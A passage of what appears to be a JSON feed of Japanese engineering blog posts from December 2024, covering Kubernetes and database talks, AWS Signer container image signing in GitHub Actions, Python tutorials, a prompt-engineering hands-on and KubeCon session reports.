DBの話しすぎて、Kubernetesユーザーからするとちょっと違うなという話をしてしまったと反省した記憶があります。Kubernetes上でOracle_Databaseの運用を楽にするOraOperatorの紹介 - Speaker Deckこの時期はOracle DB x Kubernetesの熱が上がりましたが、今はそこまででもありません。今はやっぱりPostgreSQLだとCloud NativePGに熱を上げてます。2024-12-17 Database Engineering Meetup #5 - connpass2024年の登壇納はDatabase Engineering Meetupでした。ちょうど11月下旬ごろにKubeCon NA 2024があり、そこでDB関連のセッションが半年前のKubeConから3倍近くに増えておりそれをまとめた内容です。KubeCon NA 2024の全DB関連セッションを紹介 - Speaker Deck2024年のはじめごろはGoogle Cloudを中心としたパブリッククラウドを主軸としたCloud Nativeから、Oracle x GKEを通してKubernetesという流れでした。データベースエンジニアを自称する限り、Kubernetesからは逃げられないと思っています。来年もKubernetesを頑張ります。2024年は全部で7本の登壇をしたようです。ブログ関連はてなブログでは主に読んだ論文やドキュメント、セッションレポートなどをまとめ、zennでは何かを調べてまとめたものや検証した結果をまとめるように使い分け運用しました。12月のアドベントカレンダーシーズンにKubeCon NAのセッションレポートを書いていたところ、最後の投稿が2023年の振り返りをするで焦ったのは秘密です。nnaka2992.hatenablog.comzennの方は2023年と同様に社内向けに話すもののうち社外に出しても問題ないようなものを垂れ流していましす。2025年も引き続き技術検証方面に力をいれたいのでzennを活発に出来たらなと思います。全部で11本のブログを書いたようです。まとめ2024年はがむしゃらに本数を意識した1年でした。来年も数にはこだわっていきたいですが、内容はKubernetesとPostgreSQLとGoogle Cloudあたりに注力していけたらいいなと思っています。","isoDate":"2024-12-31T13:22:33.000Z","dateMiliSeconds":1735651353000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"rootful・rootless・privilegedコンテナの違い/rootful_rootless_privileged_container_difference","link":"https://speakerdeck.com/moz_sec_/rootful-rootless-privileged-container-difference","contentSnippet":"2024/12/28に開催されたOWASP KansaiのLTの資料です。\\rhttps://owasp-kansai.doorkeeper.jp/events/179740","isoDate":"2024-12-28T05:00:00.000Z","dateMiliSeconds":1735362000000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"CloudFrontの新機能『VPCオリジン』をTerraformで書いてみた","link":"https://zenn.dev/nextbeat/articles/aws_vpc_origin","contentSnippet":"1.VPCオリジンとは？AWS公式ブログでの記載Amazon Virtual Private Cloud (Amazon VPC) 内のプライベートサブネットでホストされているアプリケーションからのコンテンツ配信を可能にする新機能です。AWS re:Invent 2024で新発表された機能です。プライベートサブネット内のアプリケーションを直接CloudFrontを通じて配信可能なため、よりセキュアな構成を実現できる機能です。 従来の構成イメージ VPCオリジンを用いた構成イメージ 2.メリット ①セキュリティの強化ALBをパブリックサブネ...","isoDate":"2024-12-27T01:17:11.000Z","dateMiliSeconds":1735262231000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"Youkiを動かしてみる","link":"https://qiita.com/ys1/items/7e92327c7728471cfc65","contentSnippet":"概要Kubernetesではコンテナを作成するとき、コンテナランタイム(高レベルランタイム、低レベルランタイム)を利用しています。低レベルランタイムであるyoukiを通じてコンテナに関する理解をちょっと深めます。Youkiとは?YoukiはRust言語で記載され...","isoDate":"2024-12-25T10:51:53.000Z","dateMiliSeconds":1735123913000,"authorName":"Yusuke Sakurai","authorId":"ysakurai"},{"title":"Shadcnを使っていてF8でキーボードのフォーカスが取られる","link":"https://zenn.dev/meziron/articles/a0410531f36ecc","contentSnippet":"shadcn を使っていて F8(半角カタカナ変換)がうまくいかない現象shadcn を使用して開発しているプロジェクトで、F8キーを押すとキーボードのフォーカスが奪われてしまい半角カタカナに変換がうまくいかないという現象にぶつかってしまいました。利用しているのUIライブラリなどを追っても中々原因が分からず困っていました。そこで F8 という文字列でコードベースを検索してみると、下記のような interface が見つかりました。interface ToastViewportProps extends PrimitiveOrderedListProps {    /** ...","isoDate":"2024-12-25T06:20:18.000Z","dateMiliSeconds":1735107618000,"authorName":"Daichi Kugimiya","authorId":"kugimiya"},{"title":"AWS re:Invent 2024 へ行って来ました","link":"https://sreake.com/blog/aws-reinvent-2024/","contentSnippet":"スリーシェイクの山田です。 今回、Amazon Web Services (以下 AWS) が 12月 にラスベガスで開催した世界規模のカンファレンスである AWS re:Invent 2024 に現地参加してきたので、 […]The post AWS re:Invent 2024 へ行って来ました first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-12-23T23:00:00.000Z","dateMiliSeconds":1734994800000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Workforce Identity + Auth0 で Vertex AI Search の ACL 制御を行う","link":"https://zenn.dev/satohjohn/articles/a422ee68dd3485","contentSnippet":"3-shake AdventCalendar 第2シーズン 23日目の記事になります。2回目の登場です。今回は真面目な(?)技術記事になります。私としては前回書いた記事も大真面目でしたが。 概要今回やりたいこととしては、ウェブアプリケーション上で Id Provider(以後 IdP) 認証をして、その結果を利用して Vertex AI Agent Builder の Search 機能(以後めんどいので旧称の Vertex AI Search として説明) の ACL による検索の権限管理を行うというものです。今回 IdP として Auth0 を利用します。そのため、少し A...","isoDate":"2024-12-22T18:03:43.000Z","dateMiliSeconds":1734890623000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"AWS Signerにおけるコンテナ署名の実装","link":"https://blog.masasuzu.net/entry/2024/12/22/132803","contentSnippet":"この記事は3-shake Advent Calendar 2024の22日目の記事です。AWS Signerを使ったコンテナイメージの署名処理を扱った案件があったのでこちらの紹介となります。ただ、後述するように完成には至ってないです。それでもAWS Signerを使った署名処理と署名検証についての概要をお伝えできるかなと思います。今回のシステムはAWS ECS で Web サービスを運用しています。GitHub Actions を利用してデプロイを行っています。構成としては至ってベーシックな形になっています。今回、コンテナイメージのセキュリティ強化のため、ECR に保存されているイメージが改竄されていないことを保証する要件が追加されました。この記事では、AWS Signer を用いたコンテナイメージの署名と検証の実装、そして現状の課題と今後について記述します。AWS SignerとはWhat is AWS Signer? - AWS SignerAWS Signer はフルマネージドなコード署名サービスです。従来は Lambda 関数などで利用されていましたが、2023年の6月にECRのイメージ署名にも対応しました。AWS がコンテナイメージへの署名を導入Notary ProjectのNotation CLIを用いることで、ECRに保存されているコンテナイメージを署名することができ、署名ファイルをコンテナイメージとともにECRに保存できます。これによりコンテナイメージの真正性と完全性を検証することができます。ECS \xd7 AWS Signer を使ったイメージ署名ワークフローを試してみた - Speaker Deckなお、AWS Signerによるイメージ署名に゙関してはNRI ネットコム様のスライドに詳しく書かれているのでこちらを参照するとより理解が深まります。デプロイフロー変更前デプロイフローとしてはGitHub Actionsでレポジトリ内のソースをdocker buildしたものをECRにpushし、ECS Serviceにデプロイするシンプルなワークフローになります。変更前変更後このワークフローにコンテナイメージ署名の処理を追加します。notationコマンドにSigner Profileのarnを指定して、署名と検証をそれぞれ行う形になります。今回は、GitHub Actions ワークフローに AWS Signer を使った処理を組み込みます。ECRにpushしたイメージに対して署名を行うように変更しました。署名したあとに署名検証を行うことになります。後述しますが、これだけだと本来は不完全なものです。変更後実装ここから実装を見て行きます。先述したワークフローに帰るために以下の変更が必要となります。インフラ側AWS Signer Profileの追加デプロイ用IAM RoleにAWS Signer Profileへのアクセス権の追加デプロイ側署名処理の追加Terraformインフラ側の変更を見ていきましょう。追加箇所としてはSigner Profileの追加とGitHub Actions用のIAM Policyへの権限追加となります。変更箇所以外は今回は割愛しています。platform_idを\\"Notation-OCI-SHA384-ECDSA\\"に指定してSigner Profileを作成します。レポジトリ名をProfile名にしており、レポジトリ名が - 区切りで、Profile名が - を使えないという事情で _ への置換処理をしています。Siner Profileresource \\"aws_signer_signing_profile\\" \\"main\\" {  platform_id = \\"Notation-OCI-SHA384-ECDSA\\"  # profile名に-が使えないので置換  name = replace(var.repository_name, \\"-\\", \\"_\\")}先に作ったSigner Profileへの\\"signer:GetSigningProfile\\"と\\"signer:SignPayload\\"の許可をデプロイ用のRoleのPolicyに付与します。GitHub Actions用IAM Roledata \\"aws_iam_policy_document\\" \\"deploy_policy\\" {  #前略  # イメージ署名  # Inline policies for Signer - AWS Signer  # https://docs.aws.amazon.com/ja_jp/signer/latest/developerguide/authen-inlinepolicies.html  statement {    sid    = \\"SignImage\\"    effect = \\"Allow\\"    actions = [      \\"signer:GetSigningProfile\\",      \\"signer:SignPayload\\"    ]    resources = [      var.signer_profile_arn    ]  }  # 後略}デプロイsigner policyのファイルをあらかじめ作っておきます。このPolicyを利用して、署名検証を行います。.github/aws/signer_policy.json{    \\"version\\":\\"1.0\\",    \\"trustPolicies\\":[      {          \\"name\\":\\"aws-signer-tp\\",          \\"registryScopes\\":[            \\"*\\"          ],          \\"signatureVerification\\":{            \\"level\\":\\"strict\\"          },          \\"trustStores\\":[            \\"signingAuthority:aws-signer-ts\\"          ],          \\"trustedIdentities\\":[            \\"arn:aws:signer:${region}:${account_id}:/signing-profiles/${profile_name}\\"          ]      }    ]}既存のECSのデプロイワークフローにnotationのインストール、イメージ署名処理、イメージ署名検証の処理を追記します。リリースブランチにpushされたことを契機にデプロイが走る形です。.github/workflows/deploy.yamlname: Deploy to ECSon:  push:    branches: [\'release\']env:  AWS_REGION: ap-northeast-1  ECR_REPOSITORY: ${レポジトリ名}  SIGNER_PROFILE_ARN: ${Signer Profile ARN}  SIGNER_POLICY_JSON: .github/aws/signer_policy.jsonjobs:  deploy:    name: Deploy to ECR, ECS    runs-on: ubuntu-latest    steps:      ### 前略      - name: Setup Notation        run: |          wget https://d2hvyiie56hcat.cloudfront.net/linux/amd64/installer/deb/latest/aws-signer-notation-cli_amd64.deb          sudo dpkg -i aws-signer-notation-cli_amd64.deb      - name: Sign image        env:          ECR_REGISTRY: ${{ steps.login-ecr.outputs.registry }}          IMAGE_TAG: ${{ github.sha }}        run: |          notation sign $ECR_REGISTRY/$ECR_REPOSITORY:$IMAGE_TAG --plugin \\"com.amazonaws.signer.notation.plugin\\" --id \\"$SIGNER_PROFILE_ARN\\"      - name: Verify image        env:          ECR_REGISTRY: ${{ steps.login-ecr.outputs.registry }}          IMAGE_TAG: ${{ github.sha }}        run: |          notation policy import $SIGNER_POLICY_JSON          notation verify $ECR_REGISTRY/$ECR_REPOSITORY:$IMAGE_TAG      ### 後略課題ここまででイメージの署名処理および署名検証の実装はできました。しかしながら、いくつか課題があります。CIとCDの分離先の実装を見るとわかるのですが、署名したイメージを即時署名検証していることがわかります。これは同じイメージに対して行われているため、実質的な検証にはなっていません。真の改竄検知のためには、CI/CD パイプラインを分離し、デプロイ時に別途署名検証を行う必要があります。また、pushしたコンテナイメージの脆弱性チェックもデプロイ前に行うことが望ましいです。そこで下記のように変更したいところです。ただ、デプロイのフローが変わってしまうので、調整が必要でまだ手をつけていない状態になります。理想正規手順以外でデプロイされたイメージの検証さらに、正規のデプロイフロー以外で起動されたタスクのイメージ検証も課題です。署名されていないイメージが起動されていても何もチェックができていない状態です。これに対するアプローチとしては、EventBridgeでタスクが起動したイベントを拾って、イメージの署名をチェックし、検証できなかったものに゙関しては処理を行う(タスクの停止や通知など)という方法があります。これはContainers on AWSで紹介されているので、この方法を実装できたらと考えています。Container image signing and verification using AWS Signer for Amazon ECS and AWS Fargate | Containers on AWS署名検証のサービス統合ここまで見ていて気付いたかもしれませんが、ECS Serviceがタスクを起動するときに署名されているかどうかをチェックするようにECSサービスと統合されていれば、独自に署名検証を実装する必要はありません。このへん、Google CloudのBinary Authorizationはサービスと統合されているので、署名検証を自前で書く必要がないと理解してます。AWSもサービスと統合して楽に使えるようになることを期待してます。Binary Authorization の概要 \xa0|\xa0 Google Cloudまとめ現状でできていることは以下のとおりです。ECRへpushしたイメージの署名処理現状課題となっているものは以下のとおりです。CI/CDの分離署名されていないコンテナイメージが起動されていないかのチェックこの記事では、AWS Signer を用いたコンテナイメージの署名実装と、残された課題について説明しました。まだできていないことが多いですが、まずビルドしたイメージに対して署名を行うという第一歩を踏み出しました。ここから署名検証の仕組みを強化し、よりセキュアなコンテナ運用を実現するために、引き続き改善に取り組んでいきたいと思ってます。参考リンクAWS がコンテナイメージへの署名を導入AWS Signer と Amazon EKS におけるコンテナイメージ署名の提供開始 | Amazon Web Services ブログECS \xd7 AWS Signer を使ったイメージ署名ワークフローを試してみた - Speaker DeckSign container images in Signer - AWS SignerContainer image signing and verification using AWS Signer for Amazon ECS and AWS Fargate | Containers on AWSBinary Authorization の概要 \xa0|\xa0 Google Cloud","isoDate":"2024-12-22T04:28:03.000Z","dateMiliSeconds":1734841683000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"[Python]ロギングの基本的な書き方","link":"https://zenn.dev/takehiro1111/articles/python_logging","contentSnippet":"loggingとは？ただ単純に表示させたいならprint文でも良いが、ログを残すのに特化した機能が豊富なライブラリ。ドキュメントでは以下のように定義されている。 参考logging は、あるソフトウェアが実行されているときに起こったイベントを追跡するための手段です。ソフトウェアの開発者は、特定のイベントが発生したことを示す logging の呼び出しをコードに加えます。イベントは、メッセージで記述され、これに変数データ (すなわち、イベントが起こる度に異なるかもしれないデータ) を加えることもできます。イベントには、開発者がそのイベントに定めた重要性も含まれます。...","isoDate":"2024-12-22T04:15:26.000Z","dateMiliSeconds":1734840926000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"[Python]datetimeモジュールの使い方","link":"https://zenn.dev/takehiro1111/articles/python_datetime","contentSnippet":"1.datetimeモジュールとは？ ドキュメントの記載datetime モジュールは、日付や時刻を操作するためのクラスを提供しています。日付や時刻に対する算術がサポートされている一方、実装では出力のフォーマットや操作のための効率的な属性の抽出に重点を置いています。 タイムゾーンの解決aware オブジェクトを必要とするアプリケーションのために、 datetime と time オブジェクトは追加のタイムゾーン情報の属性 tzinfo を持ちます。 tzinfo には抽象クラス tzinfo のサブクラスのインスタンスを設定できます。 これらの tzinfo ...","isoDate":"2024-12-21T06:37:30.000Z","dateMiliSeconds":1734763050000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"スリーシェイク所属の早川大貴がクラウドネイティブ技術を推進するCNCF Ambassadorsに就任","link":"https://sreake.com/blog/cncf_ambassadors/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）所属の早川大貴が、クラウドネイティブ技術を推進するCNCF Ambassadorsに就任したことをお知らせします。The post スリーシェイク所属の早川大貴がクラウドネイティブ技術を推進するCNCF Ambassadorsに就任 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-12-20T08:39:11.000Z","dateMiliSeconds":1734683951000,"authorName":"Sreake","authorId":"Sreake"},{"title":"[Python]@dataclassの使い方","link":"https://zenn.dev/takehiro1111/articles/python_class_dataclasses","contentSnippet":"@dataclassとは？デコレータの一種イニシャライザでフィールドに引数の値を設定する処理を自動で生成してくれる。 通常の設定class Nouse():  def __init__(self,name,age,gender,job)    self.name = name    self.age = age    self.gender = gender    self.job = job# 引数が多くなりインスタンス変数の設定が増えると管理や可視性の面で難しい。 @dataclassを用いた書き方from dataclasses imp...","isoDate":"2024-12-20T07:22:31.000Z","dateMiliSeconds":1734679351000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"[Python]Classの基礎文法についてまとめてみた","link":"https://zenn.dev/takehiro1111/articles/python_class_basic","contentSnippet":"Classの概念公式ドキュメントの記載クラスはデータと機能を組み合わせる方法を提供します。 新規にクラスを作成することで、新しいオブジェクトの 型 を作成し、その型を持つ新しい インスタンス が作れます。 クラスのそれぞれのインスタンスは自身の状態を保持する属性を持てます。 クラスのインスタンスは、その状態を変更するための (そのクラスが定義する) メソッドも持てます。 要約データ(属性)と、それを操作するための機能(メソッド)をひとまとまりにした「設計図」みたいなもの。その設計図をもとにいくつでもインスタンス(実体)を作れ、各インスタンスは自分用の属性と...","isoDate":"2024-12-20T06:17:07.000Z","dateMiliSeconds":1734675427000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"生成AIでGitHubソースコード取得して仕様書を作成","link":"https://speakerdeck.com/shukob/sheng-cheng-aidegithubsosukodoqu-de-siteshi-yang-shu-wozuo-cheng","contentSnippet":"https://generative-ai-conf.connpass.com/event/335205/\\r2024生成AI革命期を振り返る忘年会にて、\\r「生成AIでGitHubソースコード取得して仕様書を作成する」というテーマでLTさせていただきました。","isoDate":"2024-12-20T05:00:00.000Z","dateMiliSeconds":1734670800000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"[Python]各データ型のメソッドを整理","link":"https://zenn.dev/takehiro1111/articles/python_class","contentSnippet":"1.List 特徴順序があり、変更可能（ミュータブル）。重複要素もOKで、インデックスで要素にアクセスできる メソッド一覧print(dir(list))[\'__add__\', \'__class__\', \'__class_getitem__\', \'__contains__\', \'__delattr__\', \'__delitem__\', \'__dir__\', \'__doc__\', \'__eq__\', \'__format__\', \'__ge__\', \'__getattribute__\', \'__getitem__\', \'__getstate__\', \'__gt__...","isoDate":"2024-12-20T02:25:26.000Z","dateMiliSeconds":1734661526000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"KueueによるKubernetesネイティブなジョブ制御を試してみる","link":"https://sreake.com/blog/kueue-kubernetes-native-job-control/","contentSnippet":"Kueue KueueはKubernetesのSIG-Schedulingのサブプロジェクトとして開発が進められている、クラスター内のバッチ・HPC・AI/MLといったジョブのキューイングを提供するAPIとコントローラの […]The post KueueによるKubernetesネイティブなジョブ制御を試してみる first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-12-19T03:05:13.000Z","dateMiliSeconds":1734577513000,"authorName":"Sreake","authorId":"Sreake"},{"title":"プロンプトエンジニアリング プログラミング ハンズオン","link":"https://shu-kob.hateblo.jp/entry/2024/12/17/185729","contentSnippet":"genai-users.connpass.comこの記事は上記勉強会の資料です。shu-kob.hateblo.jp↑上記記事を参考にサービスアカウントの設定をしてください。※ Google Cloudの無料期間が終了していると、課金されますが、ハンズオンの内容だけだと数百円もいかないと考えています。料金は確実には言えないので、Google Cloudはご自身の責任でご使用ください。github.com↑今回のサンプルコードgit clone https://github.com/shu-kob/prompt_engineeringcd prompt_engineeringpip install vertexaiLangChainを使わずVertex AIのライブラリを使用シンプルなVertex AIでGeminiを実行project_id = \\"PROJECT_ID\\" # 書き換える実行python3 generate_content.pyresponse = model.generate_content(  \\"プロンプトエンジニアリングとは\\")プロンプトを変更して実行してみましょう。Zero Shot プロンプティングproject_id = \\"PROJECT_ID\\" # 書き換える実行python3 zero_shot_prompting.pyprompt = \\"\\"\\"以下はニュース記事のタイトルです。「政治」「経済」「芸能」「スポーツ」「科学」「その他」のうち1つに分類してください。回答だけ一言で出力してください===========================紅白出場歌手の選考基準 NHK公開\\"\\"\\"プロンプトを変更して実行してみましょう。Few Shot プロンプティングproject_id = \\"PROJECT_ID\\" # 書き換える実行python3 few_shot_prompting.pyprompt = \\"\\"\\"以下はニュース記事のタイトルです。「政治」「経済」「芸能」「スポーツ」「科学」「その他」のうち1つに分類してください。回答だけ一言で出力してください===========================「紅白出場歌手の選考基準 NHK公開」===========================以下は例です「G20 バイデン氏不在で集合写真」:政治「岡田将生&高畑充希結婚 SNS反応」:芸能\\"\\"\\"プロンプトを変更して実行してみましょう。LangChainを使用langchain_google_vertexai を使用pip install langchain_google_vertexaipython3 invoke.pymessages = [  (\\"human\\", \\"ネコの鳴き真似をしてください。\\"),]プロンプトを変更して実行してみましょう。PromptTemplateを使用pip install langchain_corepip install pydantic==2.9.0実行python3 prompt_template.pyプロンプトテンプレートやQuestionを変更して実行してみましょう。ChatPromptTemplateを使用実行python3 chat_prompt_template.pyprompt_template = ChatPromptTemplate.from_messages([    (\\"system\\", \\"ステップバイステップで考えてください。\\"),    (\\"human\\", \\"{question}\\"),])question = \\"\\"\\"10 + 2 * 3 - 4 * 2\\"\\"\\"システムプロンプトやQuestionを変更して実行してみましょう。参考資料python.langchain.compython.langchain.com参考文献LangChainとLangGraphによるRAG・AIエージェント［実践］入門Google Gemini 1.5／LlamaIndex／LangChain 人工知能プログラミング実践入門","isoDate":"2024-12-17T09:57:29.000Z","dateMiliSeconds":1734429449000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Cloud Run GPU 上の PaliGemma2 に私の娘は可愛いと言わせるまで","link":"https://zenn.dev/satohjohn/articles/33b27212b3a55e","contentSnippet":"この記事は 3-shake Advent Calendar 2024 シーズン1 16日目の記事 & Jagu\'e\'r Advent Calendar 2024 4日目の記事 になります。3-shake に入社してそろそろ丸2年が経過しようとしており、感慨深く思っております。こういうカレンダーをちゃんと埋められているのをみていても、アウトプットという形で自己研鑽や表現を行う素晴らしいメンバーが多いなと日々日々感じております。そんな中で書けるのも良い経験だと感じております。という前置きを入れつつ、今回は生成 AI の中でも OSS でマルチモーダルな LLM である PaliG...","isoDate":"2024-12-16T11:20:30.000Z","dateMiliSeconds":1734348030000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"業務用Macセットアップ備忘録","link":"https://qiita.com/masaru-komiyama/items/cbd7d140cabf131688d9","contentSnippet":"この記事はアドベントカレンダー「3-shake Advent Calendar 2024 シリーズ2」の16日目の記事です。はじめに業務用Macの利用環境に関するセットアップ備忘録を記述しています。設定、導入アプリ、利用しているハードウェアなどをメモった形。ご利用...","isoDate":"2024-12-15T14:45:01.000Z","dateMiliSeconds":1734273901000,"authorName":"masaru-komiyama","authorId":"masaru-komiyama"},{"title":"KubeCon NA 2024: Goodbye etcd! Running Kubernetes on Distributed PostgreSQLのセッションレポート","link":"https://nnaka2992.hatenablog.com/entry/2024/12/15/goodbyte_etcd_running_kubernetes_on_distributed_postgresql","contentSnippet":"この記事は以下アドベントカレンダー15日目の記事です。3-shake Advent Calendar 2024 シリーズ2Kubernetes Advent Calendar 2024 シリーズ2Goodbye etcd! Running Kubernetes on Distributed PostgreSQL セッションレポートセッション概要 https://kccncna2024.sched.com/event/1i7rt/goodbye-etcd-running-kubernetes-on-distributed-postgresql-denis-magda-yugabyteセッション動画 www.youtube.comこのセッションはKubernetesクラスタのメタデータストアとして利用されるetcdをDistributed PostgreSQLであるYugabyteDBに置き換えた方法を紹介し、デモを行っています。What\'s etcd?セッションはetcdの解説から始まりました。etcdは分散可能で可用性の高いキーバリューストアであり、シンプルながらも強力なデータベースとして機能します。Raftプロトコルを用いることで、複数のマシンやVMで構成されたクラスタ全体にわたって変更を複製し、ノード障害発生時にも一貫したデータと継続的な動作を保証します。Kubernetesはこのetcdをメタデータストアとして活用し、サービスのポート数やデプロイメントのPod数といったクラスタの状態を管理しています。このセクションはetcdの役割を明確に示し、Kubernetesにおける重要性を理解する上で有用でした。etcdがKubernetesの心臓部と言える重要な役割を担っていることを再認識させられました。Why some are not happy with etcdetcdは多くのKubernetesクラスタで標準的に利用されていますが、大規模環境（100～1000ノード）ではスケーラビリティに課題があることが指摘されました。このようなケースでは、etcdから分散データベースへの移行が必要となります。さらに、etcdプロジェクトへのコントリビュータ不足も懸念材料として挙げられており、Kubernetesが必要とする機能追加への対応が遅れる可能性が示唆されました。このセクションは、etcdの潜在的な問題点を浮き彫りにし、代替手段を検討する必要性を示唆しています。特に大規模運用を想定している場合、etcdのスケーラビリティの限界は深刻な問題になり得ます。KineKineはKubernetesクラスタとリレーショナルデータベース間の仲介役として機能するシミュレータレイヤです。etcd APIをSQLに変換することで、PostgreSQLやMySQLのようなリレーショナルデータベースをKubernetesのメタデータストアとして利用可能にします。Kubernetes APIサーバーが発行したetcd APIをKineがSQLに変換し、データベースに実行することで、etcdの代替を実現します。このセクションはKineの動作原理を簡潔に説明し、リレーショナルデータベースをKubernetesと統合する仕組みを理解する上で重要です。Kineの存在によって、既存のデータベース基盤を活用したKubernetes運用が可能になります。Hands-onデモ環境はGoogle Cloud上の3つのCompute Engine（us-westリージョンの異なるゾーン）に構築されたk3sクラスタで、純粋なPostgreSQLと分散型PostgreSQLであるYugabyteDBの2つのシナリオが示されました。純粋なPostgreSQLは単一VMで、YugabyteDBは3台のVMで実行され、マルチゾーン、マルチリージョン、マルチクラウド/オンプレミス環境への拡張可能性が示唆されました。このセクションはデモ環境の概要を説明し、異なるデータベース構成でのKubernetes運用の可能性を示しています。実環境に近い構成でのデモは、KineとYugabyteDBの有効性を理解する上で非常に役立ちます。Kubernetes on Pure PostgreSQLyoutu.beこのデモでは、PostgreSQLが動作するサーバ上でk3sを実行し、Kineが必要とするオブジェクトがPostgreSQLに作成される様子、そしてk3s自体の動作確認が示されました。既存のPostgreSQL環境へのKubernetesの導入を検討する際に、このデモは具体的な手順と動作イメージを提供してくれます。データベース管理者にとって、Kineによるデータベースへの影響を視覚的に確認できる点は非常に重要です。Kubernetes on YugabyteDBYugabyteDBとは？YugabyteDBは、PostgreSQL互換の分散SQLデータベースです。クエリレイヤはPostgreSQLからフォークされ、ストレージレイヤはLSMツリーベースの実装1を採用しています。複数サーバ・複数リージョンでの運用が可能で、クエリ分散やノード障害時の継続動作を実現します。etcdと同様にRaftプロトコルを利用することで、データの一貫性を確保し、ネットワーク分断時のスプリットブレインにも対応します。このセクションはYugabyteDBの特徴を説明し、高可用性と分散性を備えたデータベースとしての利点を明確に示しています。etcdの代替としてYugabyteDBを検討する際に、この情報は非常に重要です。デモyoutu.beYugabyteDBクラスタ上でk3sを実行するデモでは、PostgreSQLの場合とほぼ同様の手順でKubernetesを起動できることが示されました。YugabyteDBのダッシュボードを用いて、データベースの情報やKineが作成した情報を確認できる点も強調されました。さらに、Kubernetesのサンプルアプリを起動することで、etcdベースのKubernetesと同等の動作が確認されました。1台のCompute Engineを停止させることでYugabyteDBノードの障害をシミュレートし、データベースとKubernetesが継続して動作することを実証しました。このデモは、YugabyteDBの耐障害性と高可用性を視覚的に示し、実運用環境での信頼性を裏付けています。結論このセッションは、KineとYugabyteDBを用いることで、etcdの代替としてリレーショナルデータベースをKubernetesのメタデータストアとして利用できることを示しました。特に、YugabyteDBの分散性と耐障害性は、大規模Kubernetesクラスタの運用においてetcdのスケーラビリティやコントリビュータ不足といった課題を解決する可能性を示唆しています。ただし、YugabyteDBの導入には運用コストや学習コストといった新たな課題も発生するため、etcdとの比較検討が必要です。同様にセッションではKineをネイティブに利用しているk3sを利用していますが、k3sはあくまでKubernetesの軽量ディストリビューションであるため完全に同じものではないため、本当にk3sで良いのかという比較検討も必要になります。またセッション内では100を超えるノードから構成されるKubernetesクラスタではetcdのスケーラビリティが足りず、他のメタデータストアが必要になると紹介していますが、なぜ必要になるかは説明が不足していると感じました。これはKubernetesクラスタが大規模化することでAPIサーバが発行するクエリがetcdの対応可能な10000 rpsを越え始めるためです。より詳細な説明はGoogle Cloudの65000ノードを越えるGKEクラスタをSpannerでホストしていることを紹介しているブログが参考になるでしょう。cloud.google.com","isoDate":"2024-12-15T14:16:36.000Z","dateMiliSeconds":1734272196000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Kubernetes The Hard Wayにトライする","link":"https://zenn.dev/moz_sec/articles/0dbb3b7dd08ab3","contentSnippet":"KuberenetesKubernetesとは、複数のコンピュータでコンテナをいい感じに動かしてくれるものです。Kubernetesの説明はいろんなサイトに書いてあるため、そちらを参照してください。公式サイトも参考になります。https://kubernetes.io/docs/concepts/overview/ Kuberentes The Hard WayKubernetes The Hard Wayとは、kubeadmやkubesplayのような、クラスタ構築ツールに頼らず、コンテナランタイムや各コンポーネントを自分でインストールして、設定をし、Kubernetes...","isoDate":"2024-12-15T12:14:59.000Z","dateMiliSeconds":1734264899000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"Reckoner における Datadog Error Tracking の活用事例","link":"https://zenn.dev/nomadblacky/articles/1901ceb9154c7b","contentSnippet":"この記事は、3-shake Advent Calendar 2024 の 15 日目の記事です。 はじめに私の所属する株式会社スリーシェイクでは、Reckoner というデータパイプライン構築の SaaS を開発しています。https://reckoner.io/「SaaSをつなぐ。業務が変わる。ビジネスが進化する。」直感的なユーザーインターフェイスで、多種多様な SaaS のデータをつなぎ合わせることで、データ活用・データの民主化を実現します。Reckoner では多種多様な連携先に対応しているため、様々なエラーが発生する可能性があります。そのため、エラーの迅速な発見と...","isoDate":"2024-12-15T10:35:38.000Z","dateMiliSeconds":1734258938000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"KubeCon NA 2024: Database DevOps: CD for Stateful Applicationsのセッションレポート","link":"https://nnaka2992.hatenablog.com/entry/2024/12/14/database_devops_cd_for_stateful_applications","contentSnippet":"この記事は以下アドベントカレンダー14日目の記事です。3-shake Advent Calendar 2024 シリーズ2Kubernetes Advent Calendar 2024 シリーズ1Database DevOps: CD for Stateful Applications セッションレポートセッション概要:https://kccncna2024.sched.com/event/1i7na/database-devops-cd-for-stateful-applications-stephen-atwell-harnessio-christopher-crow-pure-storage?linkback=grid-fullセッションスライドhttps://static.sched.com/hosted_files/kccncna2024/86/Harness-Portworx%20Kubecon%202024.pdfこの記事内の画像は全てこのスライドより引用しています。セッション動画  www.youtube.comこのレポートでは、KubeCon + CloudNativeCon North America 2024 のセッション「Database DevOps: CD for Stateful 